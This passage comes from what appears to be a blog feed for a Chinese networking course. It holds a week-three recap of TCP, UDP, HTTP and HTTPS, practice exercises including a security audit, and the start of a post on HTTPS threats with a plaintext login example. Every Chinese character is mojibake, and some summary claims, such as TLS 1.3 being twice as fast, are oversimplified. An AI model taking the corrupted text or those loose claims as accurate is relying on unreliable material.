¸å¿ƒè¦ç‚¹"><a href="#6-2-æ ¸å¿ƒè¦ç‚¹" class="headerlink" title="6.2 æ ¸å¿ƒè¦ç‚¹"></a>6.2 æ ¸å¿ƒè¦ç‚¹</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">TCPï¼š<br>ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥<br>å››æ¬¡æŒ¥æ‰‹æ–­å¼€è¿æ¥<br>é€šè¿‡åºåˆ—å·ã€ACKã€é‡ä¼ ä¿è¯å¯é æ€§<br>é€šè¿‡æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶<br>é€šè¿‡æ‹¥å¡æ§åˆ¶ç®—æ³•é¿å…ç½‘ç»œæ‹¥å¡<br><br>UDPï¼š<br>æ— è¿æ¥ã€ä¸å¯é ã€å¿«é€Ÿ<br><span class="hljs-number">8</span>å­—èŠ‚å¤´éƒ¨<br>é€‚åˆå®æ—¶åº”ç”¨<br>å¯ä»¥åœ¨åº”ç”¨å±‚å®ç°å¯é æ€§<br><br>HTTPï¼š<br>è¯·æ±‚ = è¯·æ±‚è¡Œ + è¯·æ±‚å¤´ + ç©ºè¡Œ + è¯·æ±‚ä½“<br>å“åº” = çŠ¶æ€è¡Œ + å“åº”å¤´ + ç©ºè¡Œ + å“åº”ä½“<br>æ— çŠ¶æ€ï¼Œé€šè¿‡Cookie/Sessionä¿æŒçŠ¶æ€<br>HTTP<span class="hljs-regexp">/2å¤šè·¯å¤ç”¨ï¼ŒHTTP/</span><span class="hljs-number">3</span>åŸºäºQUIC<br><br>HTTPSï¼š<br>HTTP + TLS/SSL<br>æ··åˆåŠ å¯†ï¼šRSAäº¤æ¢å¯†é’¥ + AESåŠ å¯†æ•°æ®<br>æ•°å­—è¯ä¹¦éªŒè¯èº«ä»½<br>TLS <span class="hljs-number">1.3</span>æ¯”TLS <span class="hljs-number">1.2</span>å¿«ä¸€å€<br><br>Socketç¼–ç¨‹ï¼š<br>é˜»å¡vséé˜»å¡<br>IOå¤šè·¯å¤ç”¨ï¼šselect<span class="hljs-regexp">/poll/</span>epoll<br>epollæ€§èƒ½æœ€å¥½ï¼ˆLinuxï¼‰<br>é«˜æ€§èƒ½æœåŠ¡å™¨æ¶æ„<br></code></pre></td></tr></table></figure><h3 id="6-3-å®è·µæŠ€èƒ½"><a href="#6-3-å®è·µæŠ€èƒ½" class="headerlink" title="6.3 å®è·µæŠ€èƒ½"></a>6.3 å®è·µæŠ€èƒ½</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs">å·²æŒæ¡ï¼š<br>âœ… åˆ†æTCPè¿æ¥è¿‡ç¨‹<br>âœ… ç†è§£TCPå¯é æ€§æœºåˆ¶<br>âœ… ä½¿ç”¨UDPç¼–ç¨‹<br>âœ… å®ç°IOå¤šè·¯å¤ç”¨<br>âœ… æ„å»ºHTTPæœåŠ¡å™¨<br>âœ… é…ç½®HTTPSæœåŠ¡å™¨<br>âœ… ç”ŸæˆSSLè¯ä¹¦<br>âœ… å®ç°å®‰å…¨è®¤è¯<br>âœ… ç½‘ç»œæŠ“åŒ…åˆ†æ<br>âœ… æ€§èƒ½ä¼˜åŒ–<br><br>å¾…æå‡ï¼š<br>â–¡ å¤§è§„æ¨¡å¹¶å‘å¤„ç†<br>â–¡ åˆ†å¸ƒå¼ç³»ç»Ÿ<br>â–¡ è´Ÿè½½å‡è¡¡<br>â–¡ æœåŠ¡å‘ç°<br>â–¡ å®¹å™¨åŒ–éƒ¨ç½²<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä¸‹å‘¨é¢„å‘Š"><a href="#7-ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="7. ä¸‹å‘¨é¢„å‘Š"></a>7. ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬å››å‘¨ï¼šç½‘ç»œå±‚åè®®ï¼ˆç¬¬22-28å¤©ï¼‰</strong></p><h3 id="ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€"><a href="#ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€" class="headerlink" title="ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€"></a>ç¬¬22å¤©ï¼šIPåè®®åŸºç¡€</h3><ul><li>IPv4åœ°å€å’Œå­ç½‘åˆ’åˆ†</li><li>IPæŠ¥æ–‡æ ¼å¼</li><li>IPè·¯ç”±åŸç†</li><li>NATæŠ€æœ¯</li></ul><h3 id="ç¬¬23å¤©ï¼šIPv6è¯¦è§£"><a href="#ç¬¬23å¤©ï¼šIPv6è¯¦è§£" class="headerlink" title="ç¬¬23å¤©ï¼šIPv6è¯¦è§£"></a>ç¬¬23å¤©ï¼šIPv6è¯¦è§£</h3><ul><li>IPv6åœ°å€æ ¼å¼</li><li>IPv6 vs IPv4</li><li>è¿‡æ¸¡æŠ€æœ¯</li><li>IPv6éƒ¨ç½²</li></ul><h3 id="ç¬¬24å¤©ï¼šICMPå’Œè¯Šæ–­å·¥å…·"><a href="#ç¬¬24å¤©ï¼šICMPå’Œè¯Šæ–­å·¥å…·" class="headerlink" title="ç¬¬24å¤©ï¼šICMPå’Œè¯Šæ–­å·¥å…·"></a>ç¬¬24å¤©ï¼šICMPå’Œè¯Šæ–­å·¥å…·</h3><ul><li>ICMPåè®®</li><li>pingåŸç†</li><li>tracerouteåŸç†</li><li>ç½‘ç»œè¯Šæ–­</li></ul><h3 id="ç¬¬25å¤©ï¼šARPå’Œé“¾è·¯å±‚"><a href="#ç¬¬25å¤©ï¼šARPå’Œé“¾è·¯å±‚" class="headerlink" title="ç¬¬25å¤©ï¼šARPå’Œé“¾è·¯å±‚"></a>ç¬¬25å¤©ï¼šARPå’Œé“¾è·¯å±‚</h3><ul><li>ARPåè®®</li><li>ARPç¼“å­˜</li><li>ARPæ¬ºéª—</li><li>é“¾è·¯å±‚æ¦‚è¿°</li></ul><h3 id="ç¬¬26å¤©ï¼šè·¯ç”±åè®®"><a href="#ç¬¬26å¤©ï¼šè·¯ç”±åè®®" class="headerlink" title="ç¬¬26å¤©ï¼šè·¯ç”±åè®®"></a>ç¬¬26å¤©ï¼šè·¯ç”±åè®®</h3><ul><li>é™æ€è·¯ç”±</li><li>åŠ¨æ€è·¯ç”±</li><li>RIPã€OSPFã€BGP</li><li>è·¯ç”±è¡¨</li></ul><h3 id="ç¬¬27å¤©ï¼šç½‘ç»œå®‰å…¨è¿›é˜¶"><a href="#ç¬¬27å¤©ï¼šç½‘ç»œå®‰å…¨è¿›é˜¶" class="headerlink" title="ç¬¬27å¤©ï¼šç½‘ç»œå®‰å…¨è¿›é˜¶"></a>ç¬¬27å¤©ï¼šç½‘ç»œå®‰å…¨è¿›é˜¶</h3><ul><li>é˜²ç«å¢™</li><li>VPN</li><li>IDS&#x2F;IPS</li><li>DDoSé˜²æŠ¤</li></ul><h3 id="ç¬¬28å¤©ï¼šç¬¬å››å‘¨æ€»ç»“"><a href="#ç¬¬28å¤©ï¼šç¬¬å››å‘¨æ€»ç»“" class="headerlink" title="ç¬¬28å¤©ï¼šç¬¬å››å‘¨æ€»ç»“"></a>ç¬¬28å¤©ï¼šç¬¬å››å‘¨æ€»ç»“</h3><ul><li>ç½‘ç»œå±‚çŸ¥è¯†å›é¡¾</li><li>è·¯ç”±å™¨å®ç°</li><li>ç½‘ç»œå®‰å…¨å®æˆ˜</li></ul><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ "><a href="#8-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="8. ä»Šæ—¥ç»ƒä¹ "></a>8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šå®Œæˆç»¼åˆé¡¹ç›®"><a href="#ç»ƒä¹ 1ï¼šå®Œæˆç»¼åˆé¡¹ç›®" class="headerlink" title="ç»ƒä¹ 1ï¼šå®Œæˆç»¼åˆé¡¹ç›®"></a>ç»ƒä¹ 1ï¼šå®Œæˆç»¼åˆé¡¹ç›®</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŸºäºæœ¬å‘¨æ‰€å­¦çŸ¥è¯†ï¼Œå®ŒæˆSecureWebAppé¡¹ç›®ï¼š<br><br>å¿…éœ€åŠŸèƒ½ï¼š<br><span class="hljs-bullet">1.</span> HTTPå’ŒHTTPSæœåŠ¡å™¨<br><span class="hljs-bullet">2.</span> ç”¨æˆ·æ³¨å†Œ/ç™»å½•<br><span class="hljs-bullet">3.</span> Sessionç®¡ç†<br><span class="hljs-bullet">4.</span> RESTful API<br><span class="hljs-bullet">5.</span> é™æ€æ–‡ä»¶æœåŠ¡<br><span class="hljs-bullet">6.</span> å®‰å…¨é˜²æŠ¤ï¼ˆCSRFã€XSSï¼‰<br><br>åŠ åˆ†é¡¹ï¼š<br><span class="hljs-bullet">1.</span> å¤šè¿›ç¨‹/çº¿ç¨‹æ± <br><span class="hljs-bullet">2.</span> æ€§èƒ½ç›‘æ§<br><span class="hljs-bullet">3.</span> æ—¥å¿—ç³»ç»Ÿ<br><span class="hljs-bullet">4.</span> é™æµåŠŸèƒ½<br><span class="hljs-bullet">5.</span> WebSocketæ”¯æŒ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šæ€§èƒ½æµ‹è¯•"><a href="#ç»ƒä¹ 2ï¼šæ€§èƒ½æµ‹è¯•" class="headerlink" title="ç»ƒä¹ 2ï¼šæ€§èƒ½æµ‹è¯•"></a>ç»ƒä¹ 2ï¼šæ€§èƒ½æµ‹è¯•</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¯¹ä½ çš„æœåŠ¡å™¨è¿›è¡Œå‹åŠ›æµ‹è¯•ï¼š<br><br>ä½¿ç”¨å·¥å…·ï¼š<br><span class="hljs-bullet">-</span> abï¼ˆApache Benchï¼‰<br><span class="hljs-bullet">-</span> wrk<br><span class="hljs-bullet">-</span> locust<br><br>æµ‹è¯•åœºæ™¯ï¼š<br><span class="hljs-bullet">1.</span> é™æ€æ–‡ä»¶æœåŠ¡<br><span class="hljs-bullet">2.</span> APIæ¥å£<br><span class="hljs-bullet">3.</span> å¹¶å‘è¿æ¥<br><span class="hljs-bullet">4.</span> é•¿è¿æ¥<br><br>åˆ†ææŒ‡æ ‡ï¼š<br><span class="hljs-bullet">-</span> QPSï¼ˆæ¯ç§’è¯·æ±‚æ•°ï¼‰<br><span class="hljs-bullet">-</span> å“åº”æ—¶é—´<br><span class="hljs-bullet">-</span> å¹¶å‘èƒ½åŠ›<br><span class="hljs-bullet">-</span> é”™è¯¯ç‡<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šå®‰å…¨å®¡è®¡"><a href="#ç»ƒä¹ 3ï¼šå®‰å…¨å®¡è®¡" class="headerlink" title="ç»ƒä¹ 3ï¼šå®‰å…¨å®¡è®¡"></a>ç»ƒä¹ 3ï¼šå®‰å…¨å®¡è®¡</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ£€æŸ¥ä½ çš„åº”ç”¨å®‰å…¨æ€§ï¼š<br><br>æ£€æŸ¥é¡¹ç›®ï¼š<br><span class="hljs-bullet">1.</span> HTTPSé…ç½®<br><span class="hljs-bullet">2.</span> å¯†ç å­˜å‚¨<br><span class="hljs-bullet">3.</span> Sessionå®‰å…¨<br><span class="hljs-bullet">4.</span> CSRFé˜²æŠ¤<br><span class="hljs-bullet">5.</span> XSSé˜²æŠ¤<br><span class="hljs-bullet">6.</span> SQLæ³¨å…¥é˜²æŠ¤<br><span class="hljs-bullet">7.</span> è¾“å…¥éªŒè¯<br><span class="hljs-bullet">8.</span> é”™è¯¯å¤„ç†<br><br>ä½¿ç”¨å·¥å…·ï¼š<br><span class="hljs-bullet">-</span> SSL Labs<br><span class="hljs-bullet">-</span> OWASP ZAP<br><span class="hljs-bullet">-</span> Burp Suite<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šç½‘ç»œåˆ†æ"><a href="#ç»ƒä¹ 4ï¼šç½‘ç»œåˆ†æ" class="headerlink" title="ç»ƒä¹ 4ï¼šç½‘ç»œåˆ†æ"></a>ç»ƒä¹ 4ï¼šç½‘ç»œåˆ†æ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä½¿ç”¨Wiresharkåˆ†æï¼š<br><br>ä»»åŠ¡ï¼š<br><span class="hljs-bullet">1.</span> æ•è·HTTPé€šä¿¡<br><span class="hljs-bullet">2.</span> åˆ†æTCPä¸‰æ¬¡æ¡æ‰‹<br><span class="hljs-bullet">3.</span> æŸ¥çœ‹TLSæ¡æ‰‹è¿‡ç¨‹<br><span class="hljs-bullet">4.</span> è¯†åˆ«åŠ å¯†æµé‡<br><span class="hljs-bullet">5.</span> åˆ†æDNSæŸ¥è¯¢<br><span class="hljs-bullet">6.</span> è¿½è¸ªå®Œæ•´ä¼šè¯<br><br>è¾“å‡ºï¼š<br><span class="hljs-bullet">-</span> æˆªå›¾<br><span class="hljs-bullet">-</span> åˆ†ææŠ¥å‘Š<br><span class="hljs-bullet">-</span> å‘ç°çš„é—®é¢˜<br></code></pre></td></tr></table></figure><hr><h2 id="9-æ€»ç»“"><a href="#9-æ€»ç»“" class="headerlink" title="9. æ€»ç»“"></a>9. æ€»ç»“</h2><p>æ­å–œä½ å®Œæˆäº†ç¬¬ä¸‰å‘¨çš„å­¦ä¹ ï¼ğŸ‰</p><h3 id="æœ¬å‘¨æˆå°±"><a href="#æœ¬å‘¨æˆå°±" class="headerlink" title="æœ¬å‘¨æˆå°±"></a>æœ¬å‘¨æˆå°±</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">âœ… æ·±å…¥ç†è§£<span class="hljs-variable">TCP</span>å’Œ<span class="hljs-variable">UDP</span>åè®®<br>âœ… æŒæ¡<span class="hljs-built_in">Socket</span>ç¼–ç¨‹æŠ€æœ¯<br>âœ… å­¦ä¼šæ„å»º<span class="hljs-variable">HTTP</span><span class="hljs-operator">/</span><span class="hljs-variable">HTTPS</span>æœåŠ¡å™¨<br>âœ… äº†è§£ç½‘ç»œå®‰å…¨åŸºç¡€<br>âœ… å®è·µæ€§èƒ½ä¼˜åŒ–<br>âœ… æŒæ¡è°ƒè¯•å’Œæ’é”™æŠ€å·§<br><br>å®Œæˆçš„å®æˆ˜é¡¹ç›®ï¼š<br>âœ… <span class="hljs-variable">TCP</span>è¿æ¥åˆ†æå™¨<br>âœ… <span class="hljs-variable">UDP</span>èŠå¤©å®¤<br>âœ… å¤šäººèŠå¤©æœåŠ¡å™¨ï¼ˆ<span class="hljs-variable">IO</span>å¤šè·¯å¤ç”¨ï¼‰<br>âœ… <span class="hljs-variable">HTTP</span>æœåŠ¡å™¨<br>âœ… <span class="hljs-variable">HTTPS</span>æœåŠ¡å™¨<br>âœ… è¯ä¹¦ç”Ÿæˆå™¨<br>âœ… ç»¼åˆ<span class="hljs-variable">Web</span>åº”ç”¨<br></code></pre></td></tr></table></figure><h3 id="å­¦ä¹ å»ºè®®"><a href="#å­¦ä¹ å»ºè®®" class="headerlink" title="å­¦ä¹ å»ºè®®"></a>å­¦ä¹ å»ºè®®</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> åŠ¨æ‰‹å®è·µ<br><span class="hljs-bullet">   -</span> ç†è®ºè¦ç»“åˆå®è·µ<br><span class="hljs-bullet">   -</span> å¤šå†™ä»£ç <br><span class="hljs-bullet">   -</span> å¤šåšå®éªŒ<br><br><span class="hljs-bullet">2.</span> æ·±å…¥ç†è§£<br><span class="hljs-bullet">   -</span> ä¸è¦åœç•™åœ¨è¡¨é¢<br><span class="hljs-bullet">   -</span> æ€è€ƒä¸ºä»€ä¹ˆ<br><span class="hljs-bullet">   -</span> æŸ¥çœ‹æºä»£ç <br><br><span class="hljs-bullet">3.</span> ç³»ç»Ÿå­¦ä¹ <br><span class="hljs-bullet">   -</span> ä»åº•å±‚åˆ°åº”ç”¨å±‚<br><span class="hljs-bullet">   -</span> å»ºç«‹çŸ¥è¯†ä½“ç³»<br><span class="hljs-bullet">   -</span> ç›¸äº’å…³è”<br><br><span class="hljs-bullet">4.</span> æŒç»­å­¦ä¹ <br><span class="hljs-bullet">   -</span> æŠ€æœ¯åœ¨æ¼”è¿›<br><span class="hljs-bullet">   -</span> ä¿æŒå¥½å¥‡å¿ƒ<br><span class="hljs-bullet">   -</span> å…³æ³¨æ–°æŠ€æœ¯<br></code></pre></td></tr></table></figure><h3 id="ä¸‹å‘¨å‡†å¤‡"><a href="#ä¸‹å‘¨å‡†å¤‡" class="headerlink" title="ä¸‹å‘¨å‡†å¤‡"></a>ä¸‹å‘¨å‡†å¤‡</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç¬¬å››å‘¨å°†å­¦ä¹ ç½‘ç»œå±‚åè®®ï¼š<br><br>é¢„ä¹ å†…å®¹ï¼š<br><span class="hljs-bullet">- </span>IPåœ°å€å’Œå­ç½‘<br><span class="hljs-bullet">- </span>IPv4 vs IPv6<br><span class="hljs-bullet">- </span>è·¯ç”±åŸç†<br><span class="hljs-bullet">- </span>ICMPåè®®<br><br>å‡†å¤‡å·¥å…·ï¼š<br><span class="hljs-bullet">- </span>Wireshark<br><span class="hljs-bullet">- </span>tcpdump<br><span class="hljs-bullet">- </span>pingã€traceroute<br><span class="hljs-bullet">- </span>iptables<br></code></pre></td></tr></table></figure><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä¸‰å‘¨çš„å­¦ä¹ è®©ä½ å·²ç»æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ï¼Œä»ç‰©ç†å±‚ã€æ•°æ®é“¾è·¯å±‚ï¼Œåˆ°ç½‘ç»œåŸºç¡€ï¼Œå†åˆ°ä¼ è¾“å±‚å’Œåº”ç”¨å±‚ï¼Œä½ å·²ç»æŒæ¡äº†ç½‘ç»œç¼–ç¨‹çš„æ ¸å¿ƒçŸ¥è¯†ã€‚ä¸‹å‘¨æˆ‘ä»¬å°†æ·±å…¥ç½‘ç»œå±‚ï¼Œå­¦ä¹ IPåè®®å’Œè·¯ç”±åŸç†ï¼Œè¿™å°†è®©ä½ å¯¹ç½‘ç»œæœ‰æ›´å…¨é¢çš„ç†è§£ï¼</p><p><strong>è¿›åº¦ï¼š21&#x2F;180å¤©ï¼ˆ11.7%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>20å¤©ï¼šHTTPSå’Œå®‰å…¨</title>
    <link href="/2025/11/10/20%E5%A4%A9%EF%BC%9AHTTPS%E5%92%8C%E5%AE%89%E5%85%A8/"/>
    <url>/2025/11/10/20%E5%A4%A9%EF%BC%9AHTTPS%E5%92%8C%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨"><a href="#ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨" class="headerlink" title="ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨"></a>ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£HTTPSçš„å·¥ä½œåŸç†</li><li>æŒæ¡å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†</li><li>å­¦ä¹ TLS&#x2F;SSLåè®®</li><li>äº†è§£æ•°å­—è¯ä¹¦å’ŒCA</li><li>ç†è§£HTTPSæ¡æ‰‹è¿‡ç¨‹</li><li>å­¦ä¹ å¸¸è§Webå®‰å…¨æ”»å‡»å’Œé˜²å¾¡</li><li>å®ç°ç®€å•çš„HTTPSæœåŠ¡å™¨</li></ul><hr><h2 id="1-ä¸ºä»€ä¹ˆéœ€è¦HTTPSï¼Ÿ"><a href="#1-ä¸ºä»€ä¹ˆéœ€è¦HTTPSï¼Ÿ" class="headerlink" title="1. ä¸ºä»€ä¹ˆéœ€è¦HTTPSï¼Ÿ"></a>1. ä¸ºä»€ä¹ˆéœ€è¦HTTPSï¼Ÿ</h2><h3 id="1-1-HTTPçš„å®‰å…¨é—®é¢˜"><a href="#1-1-HTTPçš„å®‰å…¨é—®é¢˜" class="headerlink" title="1.1 HTTPçš„å®‰å…¨é—®é¢˜"></a>1.1 HTTPçš„å®‰å…¨é—®é¢˜</h3><p><strong>HTTPæ˜¯æ˜æ–‡ä¼ è¾“</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix">é—®é¢˜åœºæ™¯ï¼š<br><br>ä½ åœ¨å’–å•¡å…ä½¿ç”¨å…¬å…±WiFiç™»å½•ç½‘ç«™<br>è¾“å…¥ç”¨æˆ·åï¼šalice<br>è¾“å…¥å¯†ç ï¼šmypassword123<br><br>HTTPä¼ è¾“ï¼š<br>POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;alice&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;mypassword123&quot;</span>&#125;<br><br>å±é™©ï¼š<br>âŒ ä»»ä½•äººéƒ½å¯ä»¥æˆªè·è¿™ä¸ªæ•°æ®åŒ…<br>âŒ å¯†ç è¢«æ˜æ–‡çœ‹åˆ°<br>âŒ å¯ä»¥è¢«ç¯¡æ”¹<br>âŒ æ— æ³•éªŒè¯æœåŠ¡å™¨èº«ä»½<br></code></pre></td></tr></table></figure><p><strong>HTTPçš„ä¸‰å¤§å®‰å…¨å¨èƒ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> çªƒå¬ï¼ˆEavesdroppingï¼‰<br><span class="hljs-bullet">   -</span> æ”»å‡»è€…æˆªè·æ•°æ®åŒ…<br><span class="hljs-bullet">   -</span> è¯»å–æ•æ„Ÿä¿¡æ¯<br><span class="hljs-bullet">   -</span> å¯†ç ã€ä¿¡ç”¨å¡å·ç­‰<br><br><span class="hljs-bullet">2.</span> ç¯¡æ”¹ï¼ˆTamperingï¼‰<br><span class="hljs-bullet">   -</span> ä¸­é—´äººä¿®æ”¹æ•°æ®<br><span class="hljs-bullet">   -</span> æ³¨å…¥æ¶æ„ä»£ç <br><span class="hljs-bullet">   -</span> ç¯¡æ”¹äº¤æ˜“é‡‘é¢<br><br><span class="hljs-bullet">3.</span> å†’å……ï¼ˆImpersonationï¼‰<br><span class="hljs-bullet">   -</span> ä¼ªè£…æˆåˆæ³•æœåŠ¡å™¨<br><span class="hljs-bullet">   -</span> é’“é±¼æ”»å‡»<br><span class="hljs-bullet">   -</span> ç›—å–ç”¨æˆ·ä¿¡æ¯<br></code></pre></td></tr></table></figure><h3 id="1-2-HTTPSçš„è§£å†³æ–¹æ¡ˆ"><a href="#1-2-HTTPSçš„è§£å†³æ–¹æ¡ˆ" class="headerlink" title="1.2 HTTPSçš„è§£å†³æ–¹æ¡ˆ"></a>1.2 HTTPSçš„è§£å†³æ–¹æ¡ˆ</h3><p><strong>HTTPS &#x3D; HTTP + TLS&#x2F;SSL</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTPSçš„ä¸‰å¤§ä¿è¯ï¼š<br><br><span class="hljs-bullet">1.</span> æœºå¯†æ€§ï¼ˆConfidentialityï¼‰<br>   âœ… åŠ å¯†ä¼ è¾“<br>   âœ… æ— æ³•çªƒå¬<br><br><span class="hljs-bullet">2.</span> å®Œæ•´æ€§ï¼ˆIntegrityï¼‰<br>   âœ… é˜²æ­¢ç¯¡æ”¹<br>   âœ… æ•°æ®éªŒè¯<br><br><span class="hljs-bullet">3.</span> èº«ä»½è®¤è¯ï¼ˆAuthenticationï¼‰<br>   âœ… éªŒè¯æœåŠ¡å™¨èº«ä»½<br>   âœ… é˜²æ­¢å†’å……<br><br>å®ç°æ–¹å¼ï¼š<br><span class="hljs-bullet">-</span> å¯¹ç§°åŠ å¯†ï¼šåŠ å¯†æ•°æ®<br><span class="hljs-bullet">-</span> éå¯¹ç§°åŠ å¯†ï¼šäº¤æ¢å¯†é’¥<br><span class="hljs-bullet">-</span> 